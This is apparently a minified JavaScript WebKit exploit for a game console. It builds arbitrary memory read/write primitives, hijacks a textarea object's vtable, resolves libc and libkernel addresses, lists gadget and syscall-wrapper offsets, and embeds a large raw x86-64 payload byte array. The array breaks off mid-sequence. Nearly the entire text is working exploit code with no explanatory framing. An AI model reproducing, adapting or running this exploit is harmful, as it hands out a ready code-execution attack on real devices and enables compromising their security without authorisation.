function i48_put(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;}function i48_get(a){return a[4]+a[5]*4294967296;}function addrof(x){leaker_obj.a=x;return i48_get(leaker_arr);}function fakeobj(x){i48_put(x,leaker_arr);return leaker_obj.a;}function read_mem_setup(p,sz){i48_put(p,oob_master);oob_master[6]=sz;}function read_mem(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;}function read_mem_s(p,sz){read_mem_setup(p,sz);return""+oob_slave;}function read_mem_b(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;}function read_mem_as_string(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans;}function write_mem(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];}function read_ptr_at(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;}function write_ptr_at(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);}function hex(x){return(new Number(x)).toString(16);}var malloc_nogc=[];function malloc(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}var tarea=document.createElement('textarea');var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));write_ptr_at(addrof(tarea)+0x18,fake_vt_ptr);var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(0x400);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(idx){var p=plt_ptr+idx*16;var q=read_mem(p,6);if(q[0]!=0xff||q[1]!=0x25)throw"invalid GOT entry";var offset=0;for(var i=5;i>=2;i--)offset=offset*256+q[i];offset+=p+6;return read_ptr_at(offset);}var webkit_base=read_ptr_at(fake_vtable);var libkernel_base=get_got_addr(705)-0x10000;var libc_base=get_got_addr(582);var saveall_addr=libc_base+0x2e2c8;var loadall_addr=libc_base+0x3275c;var setjmp_addr=libc_base+0xbfae0;var longjmp_addr=libc_base+0xbfb30;var pivot_addr=libc_base+0x327d2;var infloop_addr=libc_base+0x447a0;var jop_frame_addr=libc_base+0x715d0;var get_errno_addr_addr=libkernel_base+0x9ff0;var pthread_create_addr=libkernel_base+0xf980;function saveall(){var ans=malloc(0x800);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(fake_vt_ptr+0x38,0x1234);tarea.scrollLeft=0;write_mem(ans+0x400,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));return ans;}function pivot(buf){var ans=malloc(0x400);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,pivot_addr);write_ptr_at(fake_vt_ptr+0x38,buf);write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);write_ptr_at(buf,ans);tarea.scrollLeft=0;write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));}var aio_init_addr=libkernel_base+126912,fpathconf_addr=libkernel_base+126944,dmem_container_addr=libkernel_base+126976,evf_clear_addr=libkernel_base+127008,kqueue_addr=libkernel_base+127040,kevent_addr=libkernel_base+127072,futimes_addr=libkernel_base+127104,open_addr=libkernel_base+127136,thr_self_addr=libkernel_base+127168,mkdir_addr=libkernel_base+127200,pipe_addr=libkernel_base+127232,stat_addr=libkernel_base+127280,write_addr=libkernel_base+127312,evf_cancel_addr=libkernel_base+127344,ktimer_delete_addr=libkernel_base+127376,setregid_addr=libkernel_base+127408,jitshm_create_addr=libkernel_base+127440,sigwait_addr=libkernel_base+127472,fdatasync_addr=libkernel_base+127504,sigtimedwait_addr=libkernel_base+127536,get_gpo_addr=libkernel_base+127568,sched_setscheduler_addr=libkernel_base+127600,osem_open_addr=libkernel_base+127632,dynlib_get_info_addr=libkernel_base+127664,osem_post_addr=libkernel_base+127712,blockpool_move_addr=libkernel_base+127744,issetugid_addr=libkernel_base+127776,getdents_addr=libkernel_base+127808,rtprio_thread_addr=libkernel_base+127840,evf_delete_addr=libkernel_base+127872,_umtx_op_addr=libkernel_base+127904,access_addr=libkernel_base+127936,reboot_addr=libkernel_base+127968,sigaltstack_addr=libkernel_base+128e3,getcontext_addr=libkernel_base+128036,munmap_addr=libkernel_base+128080,setuid_addr=libkernel_base+128112,evf_trywait_addr=libkernel_base+128144,setcontext_addr=libkernel_base+128176,dynlib_get_list_addr=libkernel_base+128208,setsid_addr=libkernel_base+128240,fstatfs_addr=libkernel_base+128272,aio_multi_wait_addr=libkernel_base+128304,accept_addr=libkernel_base+128336,set_phys_fmem_limit_addr=libkernel_base+128368,thr_get_name_addr=libkernel_base+128400,get_page_table_stats_addr=libkernel_base+128432,sigsuspend_addr=libkernel_base+128464,truncate_addr=libkernel_base+128496,fsync_addr=libkernel_base+128528,execve_addr=libkernel_base+128573,evf_open_addr=libkernel_base+128608,netabort_addr=libkernel_base+128640,blockpool_unmap_addr=libkernel_base+128672,osem_create_addr=libkernel_base+128704,getlogin_addr=libkernel_base+128736,mincore_addr=libkernel_base+128768,shutdown_addr=libkernel_base+128800,profil_addr=libkernel_base+128832,preadv_addr=libkernel_base+128864,geteuid_addr=libkernel_base+128896,set_chicken_switches_addr=libkernel_base+128928,sigqueue_addr=libkernel_base+128960,aio_multi_poll_addr=libkernel_base+128992,get_self_auth_info_addr=libkernel_base+129024,opmc_enable_addr=libkernel_base+129056,aio_multi_delete_addr=libkernel_base+129088,rfork_addr=libkernel_base+129129,sys_exit_addr=libkernel_base+129162,blockpool_batch_addr=libkernel_base+129200,sigpending_addr=libkernel_base+129232,ktimer_gettime_addr=libkernel_base+129264,opmc_set_ctr_addr=libkernel_base+129296,ksem_wait_addr=libkernel_base+129328,sched_getparam_addr=libkernel_base+129360,swapcontext_addr=libkernel_base+129392,opmc_get_ctr_addr=libkernel_base+129424,budget_get_ptype_addr=libkernel_base+129456,msync_addr=libkernel_base+129488,sigwaitinfo_addr=libkernel_base+129520,lstat_addr=libkernel_base+129552,test_debug_rwmem_addr=libkernel_base+129584,evf_create_addr=libkernel_base+129616,madvise_addr=libkernel_base+129648,cpuset_getaffinity_addr=libkernel_base+129680,evf_set_addr=libkernel_base+129712,setlogin_addr=libkernel_base+129744,ksem_init_addr=libkernel_base+129792,opmc_disable_addr=libkernel_base+129824,namedobj_delete_addr=libkernel_base+129856,gettimeofday_addr=libkernel_base+129888,read_addr=libkernel_base+129920,thr_get_ucontext_addr=libkernel_base+129952,batch_map_addr=libkernel_base+129984,sysarch_addr=libkernel_base+130016,utc_to_localtime_addr=libkernel_base+130048,evf_close_addr=libkernel_base+130080,setrlimit_addr=libkernel_base+130112,getpeername_addr=libkernel_base+130144,aio_get_data_addr=libkernel_base+130176,lseek_addr=libkernel_base+130208,connect_addr=libkernel_base+130240,recvfrom_addr=libkernel_base+130272,getrlimit_addr=libkernel_base+130304,dynlib_get_info_for_libdbg_addr=libkernel_base+130336,thr_suspend_ucontext_addr=libkernel_base+130368,_umtx_op_addr=libkernel_base+130400,kill_addr=libkernel_base+130416,dynlib_process_needed_and_relocate_addr=libkernel_base+130448,getsockname_addr=libkernel_base+130480,osem_trywait_addr=libkernel_base+130512,execve_addr=libkernel_base+130544,flock_addr=libkernel_base+130576,sigreturn_addr=libkernel_base+130608,query_memory_protection_addr=libkernel_base+130640,pwrite_addr=libkernel_base+130672,get_map_statistics_addr=libkernel_base+130704,ksem_getvalue_addr=libkernel_base+130736,sendfile_addr=libkernel_base+130768,socketex_addr=libkernel_base+130800,unlink_addr=libkernel_base+130832,thr_resume_ucontext_addr=libkernel_base+130864,dl_get_list_addr=libkernel_base+130896,cpuset_setaffinity_addr=libkernel_base+130928,clock_gettime_addr=libkernel_base+130960,thr_kill2_addr=libkernel_base+130992,set_timezone_info_addr=libkernel_base+131024,select_addr=libkernel_base+131056,pselect_addr=libkernel_base+131088,sync_addr=libkernel_base+131120,socketpair_addr=libkernel_base+131152,get_kernel_mem_statistics_addr=libkernel_base+131184,virtual_query_all_addr=libkernel_base+131216,physhm_open_addr=libkernel_base+131248,getuid_addr=libkernel_base+131280,revoke_addr=libkernel_base+131312,sigprocmask_addr=libkernel_base+131347,setegid_addr=libkernel_base+131488,cpuset_getid_addr=libkernel_base+131520,evf_wait_addr=libkernel_base+131552,sched_get_priority_max_addr=libkernel_base+131584,sigaction_addr=libkernel_base+131616,ipmimgr_call_addr=libkernel_base+131648,aio_submit_cmd_addr=libkernel_base+131680,free_stack_addr=libkernel_base+131712,settimeofday_addr=libkernel_base+131744,recvmsg_addr=libkernel_base+131776,aio_submit_addr=libkernel_base+131808,setgroups_addr=libkernel_base+131840,aio_multi_cancel_addr=libkernel_base+131872,nanosleep_addr=libkernel_base+131904,blockpool_map_addr=libkernel_base+131936,thr_create_addr=libkernel_base+131968,munlockall_addr=libkernel_base+132e3,dynlib_get_info_ex_addr=libkernel_base+132032,pwritev_addr=libkernel_base+132064,mname_addr=libkernel_base+132096,regmgr_call_addr=libkernel_base+132128,getgroups_addr=libkernel_base+132160,osem_close_addr=libkernel_base+132192,osem_delete_addr=libkernel_base+132224,dynlib_get_obj_member_addr=libkernel_base+132256,debug_init_addr=libkernel_base+132288,mmap_dmem_addr=libkernel_base+132320,kldunloadf_addr=libkernel_base+132352,mprotect_addr=libkernel_base+132384,ksem_trywait_addr=libkernel_base+132592,ksem_close_addr=libkernel_base+132624,sched_rr_get_interval_addr=libkernel_base+132656,getitimer_addr=libkernel_base+132688,getpid_addr=libkernel_base+132720,netgetsockinfo_addr=libkernel_base+132752,get_cpu_usage_all_addr=libkernel_base+132784,eport_delete_addr=libkernel_base+132816,randomized_path_addr=libkernel_base+132848,jitshm_alias_addr=libkernel_base+132880,seteuid_addr=libkernel_base+132912,set_uevt_addr=libkernel_base+132944,clock_getres_addr=libkernel_base+132976,setitimer_addr=libkernel_base+133008,thr_exit_addr=libkernel_base+133040,sandbox_path_addr=libkernel_base+133072,thr_kill_addr=libkernel_base+133104,sys_exit_addr=libkernel_base+133136,dup2_addr=libkernel_base+133168,utimes_addr=libkernel_base+133200,pread_addr=libkernel_base+133232,dl_get_info_addr=libkernel_base+133264,ktimer_settime_addr=libkernel_base+133296,sched_setparam_addr=libkernel_base+133328,aio_create_addr=libkernel_base+133360,osem_wait_addr=libkernel_base+133392,dynlib_get_list_for_libdbg_addr=libkernel_base+133424,get_proc_type_info_addr=libkernel_base+133456,getgid_addr=libkernel_base+133488,fstat_addr=libkernel_base+133520,fork_addr=libkernel_base+133552,namedobj_create_addr=libkernel_base+133584,opmc_set_ctl_addr=libkernel_base+133616,get_resident_count_addr=libkernel_base+133648,getdirentries_addr=libkernel_base+133680,getrusage_addr=libkernel_base+133712,setreuid_addr=libkernel_base+133744,wait4_addr=libkernel_base+133776,__sysctl_addr=libkernel_base+133808,bind_addr=libkernel_base+133840,sched_yield_addr=libkernel_base+133872,dl_get_metadata_addr=libkernel_base+133904,get_resident_fmem_count_addr=libkernel_base+133936,setsockopt_addr=libkernel_base+133968,dynlib_load_prx_addr=libkernel_base+134e3,getpriority_addr=libkernel_base+134032,get_phys_page_size_addr=libkernel_base+134064,opmc_set_hw_addr=libkernel_base+134096,dynlib_do_copy_relocations_addr=libkernel_base+134128,netcontrol_addr=libkernel_base+134160,ksem_post_addr=libkernel_base+134192,netgetiflist_addr=libkernel_base+134224,chmod_addr=libkernel_base+134256,aio_suspend_addr=libkernel_base+134288,ksem_timedwait_addr=libkernel_base+134320,dynlib_dlsym_addr=libkernel_base+134352,get_paging_stats_of_all_objects_addr=libkernel_base+134384,osem_cancel_addr=libkernel_base+134416,writev_addr=libkernel_base+134448,ktimer_getoverrun_addr=libkernel_base+134480,rmdir_addr=libkernel_base+134512,sched_get_priority_min_addr=libkernel_base+134544,dynlib_unload_prx_addr=libkernel_base+134576,thr_set_name_addr=libkernel_base+134608,mlockall_addr=libkernel_base+134640,openat_addr=libkernel_base+134672,eport_open_addr=libkernel_base+134704,sigprocmask_addr=libkernel_base+134736,chdir_addr=libkernel_base+134768,physhm_unlink_addr=libkernel_base+134800,mtypeprotect_addr=libkernel_base+134832,thr_wake_addr=libkernel_base+134864,blockpool_open_addr=libkernel_base+134896,thr_new_addr=libkernel_base+134928,munlock_addr=libkernel_base+134960,fchflags_addr=libkernel_base+134992,ftruncate_addr=libkernel_base+135024,rename_addr=libkernel_base+135056,poll_addr=libkernel_base+135088,eport_trigger_addr=libkernel_base+135120,getsid_addr=libkernel_base+135152,virtual_query_addr=libkernel_base+135184,fchmod_addr=libkernel_base+135216,_umtx_unlock_addr=libkernel_base+135248,mmap_addr=libkernel_base+135280,ktimer_create_addr=libkernel_base+135312,dup_addr=libkernel_base+135344,sendmsg_addr=libkernel_base+135376,close_addr=libkernel_base+135408,is_development_mode_addr=libkernel_base+135440,getegid_addr=libkernel_base+135472,get_vm_map_timestamp_addr=libkernel_base+135504,dynlib_get_proc_param_addr=libkernel_base+135536,fcntl_addr=libkernel_base+135568,getppid_addr=libkernel_base+135600,readv_addr=libkernel_base+135632,rdup_addr=libkernel_base+135664,listen_addr=libkernel_base+135696,app_state_change_addr=libkernel_base+135728,set_gpo_addr=libkernel_base+135760,ksem_unlink_addr=libkernel_base+135792,get_cpu_usage_proc_addr=libkernel_base+135824,shm_unlink_addr=libkernel_base+135856,reserve_2mb_page_addr=libkernel_base+135888,dynlib_get_info2_addr=libkernel_base+135920,mlock_addr=libkernel_base+135952,workaround8849_addr=libkernel_base+135984,get_sdk_compiled_version_addr=libkernel_base+136016,clock_settime_addr=libkernel_base+136048,ksem_destroy_addr=libkernel_base+136080,ksem_open_addr=libkernel_base+136112,thr_set_ucontext_addr=libkernel_base+136144,get_bio_usage_all_addr=libkernel_base+136176,getdtablesize_addr=libkernel_base+136208,chflags_addr=libkernel_base+136240,shm_open_addr=libkernel_base+136272,eport_close_addr=libkernel_base+136304,dynlib_get_list2_addr=libkernel_base+136336,socketclose_addr=libkernel_base+136368,sched_getscheduler_addr=libkernel_base+136400,pathconf_addr=libkernel_base+136432,localtime_to_utc_addr=libkernel_base+136464,setpriority_addr=libkernel_base+136496,cpumode_yield_addr=libkernel_base+136528,process_terminate_addr=libkernel_base+136560,ioctl_addr=libkernel_base+136592,opmc_get_hw_addr=libkernel_base+136624,eport_create_addr=libkernel_base+136656,socket_addr=libkernel_base+136688,_umtx_lock_addr=libkernel_base+136720,thr_suspend_addr=libkernel_base+136752,is_in_sandbox_addr=libkernel_base+136784,get_authinfo_addr=libkernel_base+136816,mdbg_service_addr=libkernel_base+136848,getsockopt_addr=libkernel_base+136880,get_paging_stats_of_all_threads_addr=libkernel_base+136912,adjtime_addr=libkernel_base+136944,kqueueex_addr=libkernel_base+136976,uuidgen_addr=libkernel_base+137008,set_vm_container_addr=libkernel_base+137040,sendto_addr=libkernel_base+137072;
var payload = [233,61,6,0,0,65,84,85,83,187,130,0,0,192,72,131,236,112,72,137,217,15,50,72,193,226,32,72,199,68,36,16,102,6,0,0,72,9,208,199,4,36,127,69,76,70,72,137,245,72,141,184,64,254,255,255,72,137,230,186,4,0,0,0,255,21,194,28,0,0,76,139,5,187,28,0,0,133,192,15,133,7,1,0,0,72,137,217,73,188,85,72,137,229,83,72,131,236,15,50,72,193,226,32,72,137,195,72,9,211,76,137,100,36,28,199,68,36,36,88,72,141,29,72,141,116,36,28,72,141,187,192,48,18,0,186,12,0,0,0,65,255,208,133,192,117,21,72,199,68,36,16,114,6,0,0,72,129,195,240,20,60,0,233,88,2,0,0,76,137,100,36,40,72,141,116,36,40,199,68,36,48,88,72,141,29,72,141,187,128,94,67,0,186,12,0,0,0,255,21,60,28,0,0,133,192,117,11,72,199,68,36,16,5,5,0,0,235,49,76,137,100,36,52,72,141,116,36,52,199,68,36,60,88,72,141,29,72,141,187,64,94,67,0,186,12,0,0,0,255,21,9,28,0,0,133,192,117,21,72,199,68,36,16,3,5,0,0,72,129,195,112,164,30,0,233,232,1,0,0,76,137,100,36,64,72,141,116,36,64,199,68,36,72,88,72,141,29,72,141,187,176,90,67,0,186,12,0,0,0,255,21,204,27,0,0,133,192,116,7,49,219,233,185,1,0,0,72,199,68,36,16,1,5,0,0,72,129,195,96,163,30,0,233,164,1,0,0,72,137,217,199,68,36,4,127,69,76,70,15,50,72,193,226,32,72,141,116,36,4,72,9,208,186,4,0,0,0,72,141,184,48,72,207,255,65,255,208,76,139,5,125,27,0,0,133,192,117,91,72,137,217,199,68,36,84,88,72,141,29,15,50,72,193,226,32,72,141,116,36,76,72,9,194,72,184,85,72,137,229,83,72,131,236,72,141,154,48,72,207,255,72,137,68,36,76,72,141,187,48,127,1,0,186,12,0,0,0,65,255,208,133,192,15,133,107,255,255,255,72,199,68,36,16,116,4,0,0,72,129,195,64,158,20,0,233,22,1,0,0,72,137,217,199,68,36,8,127,69,76,70,15,50,72,193,226,32,72,141,116,36,8,72,9,208,186,4,0,0,0,72,141,184,48,106,207,255,65,255,208,76,139,5,239,26,0,0,133,192,117,91,72,137,217,199,68,36,96,88,72,141,29,15,50,72,193,226,32,72,141,116,36,88,72,9,194,72,184,85,72,137,229,83,72,131,236,72,141,154,48,106,207,255,72,137,68,36,88,72,141,187,48,127,1,0,186,12,0,0,0,65,255,208,133,192,15,133,221,254,255,255,72,199,68,36,16,85,4,0,0,72,129,195,176,167,20,0,233,136,0,0,0,72,137,217,199,68,36,12,127,69,76,70,15,50,72,193,226,32,72,141,116,36,12,72,9,208,186,4,0,0,0,72,141,184,208,20,207,255,65,255,208,131,202,255,133,192,117,110,72,137,217,199,68,36,108,88,72,141,29,15,50,72,185,85,72,137,229,83,72,131,236,72,193,226,32,72,9,208,72,137,76,36,100,72,141,152,208,20,207,255,72,141,116,36,100,72,141,184,80,138,3,0,186,12,0,0,0,255,21,32,26,0,0,133,192,15,133,80,254,255,255,72,199,68,36,16,5,4,0,0,72,129,195,112,109,40,0,72,139,69,8,186,8,0,0,0,72,141,124,36,16,72,139,48,255,211,49,210,72,131,196,112,137,208,91,93,65,92,195,72,139,71,8,76,139,72,72,76,139,64,64,72,139,70,8,72,139,16,72,129,250,5,4,0,0,117,35,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,116,193,0,72,5,32,231,213,1,233,221,0,0,0,72,129,250,85,4,0,0,117,35,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,3,211,0,72,5,96,100,234,1,233,177,0,0,0,72,129,250,116,4,0,0,117,35,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,114,211,0,72,5,16,210,234,1,233,133,0,0,0,72,129,250,1,5,0,0,117,32,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,132,9,1,72,5,48,24,44,2,235,92,72,129,250,3,5,0,0,116,9,72,129,250,5,5,0,0,117,32,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,132,9,1,72,5,176,24,44,2,235,42,131,200,255,72,129,250,114,6,0,0,117,112,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,88,227,19,1,72,5,96,1,48,2,72,139,18,73,199,64,4,0,0,0,0,73,139,136,24,1,0,0,65,199,64,20,0,0,0,0,72,190,19,0,0,0,0,0,1,56,199,1,0,0,0,0,73,137,80,48,72,131,202,255,72,139,0,73,137,65,32,73,137,65,24,72,139,135,48,1,0,0,72,137,80,96,72,137,112,88,72,137,80,104,49,192,195,83,69,49,201,72,131,236,16,65,131,200,255,185,2,16,0,0,186,3,0,0,0,190,8,0,0,0,49,255,72,199,4,36,102,6,0,0,232,180,7,0,0,72,141,116,36,8,72,141,61,64,251,255,255,72,137,195,72,137,68,36,8,232,246,1,0,0,72,137,231,72,137,222,186,8,0,0,0,255,21,101,23,0,0,72,137,223,190,8,0,0,0,232,137,7,0,0,72,139,4,36,72,131,196,16,91,195,72,131,236,24,72,137,124,36,8,72,141,116,36,8,72,141,61,17,254,255,255,232,180,1,0,0,49,192,72,131,196,24,195,65,86,65,85,65,84,85,83,73,137,253,72,129,236,128,2,0,0,255,21,77,24,0,0,76,141,180,36,130,0,0,0,72,133,192,73,137,196,117,50,49,192,233,232,0,0,0,72,141,88,8,76,137,234,72,137,217,72,141,53,222,13,0,0,76,137,247,49,192,255,21,58,24,0,0,72,137,230,76,137,247,232,223,5,0,0,255,192,117,19,76,137,231,255,21,250,22,0,0,72,133,192,117,199,233,156,0,0,0,139,68,36,12,102,37,0,208,102,61,0,128,117,223,72,139,45,75,23,0,0,72,141,61,155,13,0,0,255,21,46,24,0,0,72,137,222,72,141,61,139,13,0,0,72,137,194,255,213,133,192,117,184,72,139,45,156,22,0,0,72,137,223,255,21,11,24,0,0,72,137,199,255,213,72,137,222,72,141,156,36,129,1,0,0,72,137,197,72,137,199,255,21,63,22,0,0,102,199,69,1,114,101,72,137,233,198,69,3,101,76,137,234,72,137,223,72,141,53,54,13,0,0,49,192,255,21,149,23,0,0,76,137,247,72,137,222,232,22,5,0,0,72,137,239,255,21,217,23,0,0,233,81,255,255,255,76,137,231,255,21,187,23,0,0,184,1,0,0,0,72,129,196,128,2,0,0,91,93,65,92,65,93,65,94,195,83,72,129,236,0,1,0,0,232,133,0,0,0,232,195,7,0,0,232,116,6,0,0,232,49,254,255,255,72,137,227,72,137,199,232,145,254,255,255,232,42,5,0,0,72,141,61,207,12,0,0,232,161,254,255,255,72,141,61,221,12,0,0,232,149,254,255,255,72,137,223,72,141,21,220,12,0,0,190,0,1,0,0,49,192,255,21,163,21,0,0,72,137,223,232,92,5,0,0,72,129,196,0,1,0,0,49,192,91,195,72,199,192,37,0,0,0,233,82,12,0,0,72,199,192,54,0,0,0,233,70,12,0,0,72,199,192,11,0,0,0,233,58,12,0,0,72,131,236,8,72,141,53,145,19,0,0,72,141,61,148,12,0,0,72,199,5,255,19,0,0,0,0,0,0,232,90,5,0,0,133,192,116,42,72,141,53,111,19,0,0,72,141,61,129,12,0,0,232,67,5,0,0,133,192,116,19,72,141,53,88,19,0,0,72,141,61,125,12,0,0,232,44,5,0,0,139,61,70,19,0,0,72,141,21,71,19,0,0,72,141,53,119,12,0,0,232,251,4,0,0,139,61,45,19,0,0,72,141,21,110,19,0,0,72,141,53,112,12,0,0,232,226,4,0,0,139,61,20,19,0,0,72,141,21,141,19,0,0,72,141,53,104,12,0,0,232,201,4,0,0,139,61,251,18,0,0,72,141,21,84,19,0,0,72,141,53,87,12,0,0,232,176,4,0,0,139,61,226,18,0,0,72,141,21,123,19,0,0,72,141,53,77,12,0,0,232,151,4,0,0,139,61,201,18,0,0,72,141,21,138,19,0,0,72,141,53,77,12,0,0,232,126,4,0,0,139,61,176,18,0,0,72,141,21,249,18,0,0,72,141,53,82,12,0,0,232,101,4,0,0,139,61,151,18,0,0,72,141,21,160,18,0,0,72,141,53,82,12,0,0,232,76,4,0,0,139,61,126,18,0,0,72,141,21,15,19,0,0,72,141,53,86,12,0,0,232,51,4,0,0,139,61,101,18,0,0,72,141,21,78,19,0,0,72,141,53,75,12,0,0,232,26,4,0,0,139,61,76,18,0,0,72,141,21,181,18,0,0,72,141,53,64,12,0,0,232,1,4,0,0,139,61,51,18,0,0,72,141,21,188,18,0,0,72,141,53,53,12,0,0,232,232,3,0,0,139,61,26,18,0,0,72,141,21,187,18,0,0,72,141,53,43,12,0,0,232,207,3,0,0,139,61,1,18,0,0,72,141,21,34,18,0,0,72,141,53,33,12,0,0,232,182,3,0,0,139,61,232,17,0,0,72,141,21,177,18,0,0,72,141,53,23,12,0,0,232,157,3,0,0,139,61,207,17,0,0,72,141,21,184,17,0,0,72,141,53,14,12,0,0,232,132,3,0,0,139,61,182,17,0,0,72,141,21,103,18,0,0,72,141,53,11,12,0,0,232,107,3,0,0,139,61,157,17,0,0,72,141,21,198,17,0,0,72,141,53,10,12,0,0,232,82,3,0,0,139,61,132,17,0,0,72,141,21,229,17,0,0,72,141,53,8,12,0,0,232,57,3,0,0,139,61,107,17,0,0,72,141,21,108,18,0,0,72,141,53,246,11,0,0,232,32,3,0,0,139,61,82,17,0,0,72,141,21,163,17,0,0,72,141,53,234,11,0,0,232,7,3,0,0,139,61,57,17,0,0,72,141,21,74,17,0,0,72,141,53,217,11,0,0,232,238,2,0,0,139,61,32,17,0,0,72,141,21,249,17,0,0,72,141,53,199,11,0,0,232,213,2,0,0,139,61,7,17,0,0,72,141,21,176,17,0,0,72,141,53,187,11,0,0,232,188,2,0,0,139,61,238,16,0,0,72,141,21,207,17,0,0,72,141,53,185,11,0,0,232,163,2,0,0,139,61,213,16,0,0,72,141,21,6,17,0,0,72,141,53,182,11,0,0,232,138,2,0,0,139,61,188,16,0,0,72,141,21,141,17,0,0,72,141,53,179,11,0,0,232,113,2,0,0,139,61,163,16,0,0,72,141,21,156,17,0,0,72,141,53,176,11,0,0,232,88,2,0,0,139,61,138,16,0,0,72,141,21,195,16,0,0,72,141,53,173,11,0,0,232,63,2,0,0,139,61,113,16,0,0,72,141,21,98,16,0,0,72,141,53,155,11,0,0,232,38,2,0,0,139,61,88,16,0,0,72,141,21,113,16,0,0,72,141,53,137,11,0,0,232,13,2,0,0,139,61,63,16,0,0,72,141,21,48,17,0,0,72,141,53,119,11,0,0,232,244,1,0,0,139,61,38,16,0,0,72,141,21,167,16,0,0,72,141,53,101,11,0,0,232,219,1,0,0,139,61,13,16,0,0,72,141,21,198,16,0,0,72,141,53,83,11,0,0,232,194,1,0,0,139,61,244,15,0,0,72,141,21,101,16,0,0,88,72,141,53,66,11,0,0,233,168,1,0,0,72,199,192,3,0,0,0,233,114,8,0,0,72,199,192,4,0,0,0,233,102,8,0,0,72,199,192,5,0,0,0,233,90,8,0,0,72,199,192,6,0,0,0,233,78,8,0,0,72,199,192,10,0,0,0,233,66,8,0,0,72,199,192,9,0,0,0,233,54,8,0,0,72,199,192,58,0,0,0,233,42,8,0,0,72,199,192,57,0,0,0,233,30,8,0,0,72,199,192,21,0,0,0,233,18,8,0,0,72,199,192,122,1,0,0,233,6,8,0,0,72,199,192,22,0,0,0,233,250,7,0,0,72,199,192,123,0,0,0,233,238,7,0,0,72,199,192,124,0,0,0,233,226,7,0,0,72,199,192,128,0,0,0,233,214,7,0,0,72,199,192,136,0,0,0,233,202,7,0,0,72,199,192,137,0,0,0,233,190,7,0,0,72,199,192,188,0,0,0,233,178,7,0,0,72,199,192,189,0,0,0,233,166,7,0,0,72,199,192,190,0,0,0,233,154,7,0,0,72,199,192,16,1,0,0,233,142,7,0,0,72,199,192,222,1,0,0,233,130,7,0,0,72,199,192,237,1,0,0,233,118,7,0,0,85,83,72,131,236,8,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,37,10,0,0,255,21,89,15,0,0,69,49,201,69,49,192,137,197,49,201,49,210,49,246,72,141,61,48,10,0,0,255,21,62,15,0,0,137,239,72,141,21,173,15,0,0,137,195,72,141,53,68,10,0,0,232,79,0,0,0,88,137,223,91,72,141,21,164,15,0,0,93,72,141,53,85,10,0,0,233,55,0,0,0,83,72,137,250,72,129,236,0,2,0,0,72,141,53,41,7,0,0,72,137,227,49,192,72,137,223,255,21,127,17,0,0,72,137,222,191,222,0,0,0,255,21,89,15,0,0,72,129,196,0,2,0,0,91,195,72,199,192,79,2,0,0,233,202,6,0,0,72,199,192,80,2,0,0,233,190,6,0,0,72,131,236,8,72,137,241,49,210,72,137,254,69,49,192,191,82,2,0,0,49,192,232,160,6,0,0,90,195,72,199,192,221,1,0,0,233,149,6,0,0,72,199,192,73,0,0,0,233,137,6,0,0,72,199,192,74,0,0,0,233,125,6,0,0,72,199,192,65,0,0,0,233,113,6,0,0,72,199,192,203,0,0,0,233,101,6,0,0,72,199,192,204,0,0,0,233,89,6,0,0,72,199,192,35,2,0,0,233,77,6,0,0,72,199,192,60,2,0,0,233,65,6,0,0,72,131,236,8,139,61,153,13,0,0,72,141,21,58,15,0,0,72,141,53,141,9,0,0,232,78,255,255,255,139,61,128,13,0,0,72,141,21,241,14,0,0,72,141,53,133,9,0,0,232,53,255,255,255,139,61,103,13,0,0,72,141,21,200,14,0,0,72,141,53,123,9,0,0,232,28,255,255,255,139,61,78,13,0,0,72,141,21,231,14,0,0,72,141,53,115,9,0,0,232,3,255,255,255,139,61,53,13,0,0,72,141,21,174,14,0,0,72,141,53,105,9,0,0,232,234,254,255,255,139,61,28,13,0,0,72,141,21,133,14,0,0,72,141,53,96,9,0,0,232,209,254,255,255,139,61,3,13,0,0,72,141,21,84,14,0,0,72,141,53,86,9,0,0,232,184,254,255,255,139,61,234,12,0,0,72,141,21,107,14,0,0,72,141,53,78,9,0,0,232,159,254,255,255,139,61,209,12,0,0,72,141,21,26,14,0,0,72,141,53,73,9,0,0,232,134,254,255,255,139,